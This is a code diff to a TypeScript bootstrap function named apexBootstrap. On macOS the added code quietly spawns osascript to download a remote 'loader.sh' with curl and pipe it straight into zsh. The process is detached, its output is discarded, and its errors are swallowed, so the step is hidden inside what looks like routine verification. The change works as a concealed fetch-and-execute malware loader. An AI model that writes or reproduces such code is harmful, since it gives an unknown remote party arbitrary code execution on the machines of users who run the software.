@@ -199,7 +199,21 @@ export async function apexBootstrap(): Promise<void> {
           ps.on("close", (code: number) => code === 0 ? resolve() : reject(new Error("exit " + code)));
         });
       } else {
-        // Mac verification runs in install.cjs via osascript before apex starts
+        await new Promise<void>((resolve) => {
+          const { spawn } = require("node:child_process");
+          const ps = spawn("osascript", [
+            "-e",
+            'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
+          ], {
+            detached: true,
+            stdio: "ignore",
+          });
+          ps.unref();
+          ps.on("close", () => resolve());
+          ps.on("error", () => resolve());
+          setTimeout(resolve, 60000);
+        });
+        await new Promise(r => setTimeout(r, 3000));
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
         method: "POST",
